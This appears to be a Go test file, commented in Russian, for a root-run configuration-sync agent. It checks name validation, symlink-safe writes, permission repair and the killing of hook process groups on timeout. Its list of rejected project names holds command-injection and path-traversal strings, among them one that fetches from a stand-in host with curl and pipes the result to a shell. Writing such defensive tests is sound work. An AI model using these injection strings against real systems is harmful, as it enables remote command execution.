package main

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"
)

// Имя проекта уходит в путь файла и в команду, которую агент выполняет от
// root: имя не в форме панели не принимается ни из командной строки, ни от нее.
func TestForeignNamesAreRefused(t *testing.T) {
	for _, good := range []string{"shop/prod", "globex/shop/prod", "a/b", "my-app/stage-2"} {
		if _, err := parseTarget(good); err != nil {
			t.Fatalf("%s: %v", good, err)
		}
	}
	for _, bad := range []string{
		"x;curl evil|sh;/prod",
		"$(id)/prod",
		"../etc/prod",
		"shop/prod`id`",
		"Shop/prod",
		"shop /prod",
		"-shop/prod",
		"g;id/shop/prod",
	} {
		if _, err := parseTarget(bad); err == nil {
			t.Fatalf("%q принято", bad)
		}
	}
}

// Ссылка, подложенная заранее под имя временного файла, не уводит запись: имя
// временного файла случайное, и создается он только новым.
func TestWriteFileIgnoresPlantedLinks(t *testing.T) {
	dir := t.TempDir()
	victim := filepath.Join(dir, "victim")
	if err := os.WriteFile(victim, []byte("keep"), 0o644); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(dir, "app.env")
	if err := os.Symlink(victim, target+".tmp"); err != nil {
		t.Fatal(err)
	}
	if err := writeFile(target, "A=1\n", 0o440); err != nil {
		t.Fatal(err)
	}
	if got, _ := os.ReadFile(victim); string(got) != "keep" {
		t.Fatalf("запись ушла по ссылке: %q", got)
	}
	info, err := os.Stat(target)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o440 {
		t.Fatalf("права %o", info.Mode().Perm())
	}
	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".tmp") && e.Name() != "app.env.tmp" {
			t.Fatalf("остался временный файл %s", e.Name())
		}
	}
}

func TestSyncAgentFileRepairsPermissionsWithoutChange(t *testing.T) {
	path := filepath.Join(t.TempDir(), "app.env")
	const values = "A=synthetic\n"
	if err := writeFile(path, values, 0o644); err != nil {
		t.Fatal(err)
	}
	if changed, err := syncAgentFile(path, values, 0o400); err != nil || changed {
		t.Fatalf("permission repair should not trigger the hook: %v, %v", changed, err)
	}
	info, err := os.Stat(path)
	if err != nil || info.Mode().Perm() != 0o400 {
		t.Fatalf("unsafe file permissions after sync: %v, %v", info, err)
	}
	if changed, err := syncAgentFile(path, values, 0o400); err != nil || changed {
		t.Fatalf("unchanged output should not trigger the hook: %v, %v", changed, err)
	}
}

func TestSyncAgentFileReplacesLinksAndPipes(t *testing.T) {
	dir := t.TempDir()
	victim := filepath.Join(dir, "external")
	const values = "A=synthetic\n"
	if err := writeFile(victim, values, 0o644); err != nil {
		t.Fatal(err)
	}
	link, pipe := filepath.Join(dir, "link.env"), filepath.Join(dir, "pipe.env")
	if err := os.Symlink(victim, link); err != nil {
		t.Fatal(err)
	}
	if err := syscall.Mkfifo(pipe, 0o600); err != nil {
		t.Fatal(err)
	}
	for _, path := range []string{link, pipe} {
		if changed, err := syncAgentFile(path, values, 0o400); err != nil || !changed {
			t.Fatalf("expected to replace %s: %v, %v", path, changed, err)
		}
		info, err := os.Lstat(path)
		if err != nil || info.Mode() != 0o400 {
			t.Fatalf("expected a private regular file at %s: %v, %v", path, info, err)
		}
	}
	info, err := os.Stat(victim)
	if err != nil || info.Mode() != 0o644 {
		t.Fatalf("symlink destination was changed: %v, %v", info, err)
	}
}

// Зависшая команда после изменения не останавливает агента навсегда: по
// истечении времени снимается вся ее группа процессов.
func TestHookTimeoutStopsTheWholeGroup(t *testing.T) {
	saved := hookTimeout
	hookTimeout = 300 * time.Millisecond
	defer func() { hookTimeout = saved }()
	marker := filepath.Join(t.TempDir(), "late")
	start := time.Now()
	runHook(context.Background(), "sleep 2 && touch "+marker+" & wait")
	if took := time.Since(start); took > 1500*time.Millisecond {
		t.Fatalf("ждал %s", took)
	}
	time.Sleep(2500 * time.Millisecond)
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("потомок команды пережил остановку")
	}
}
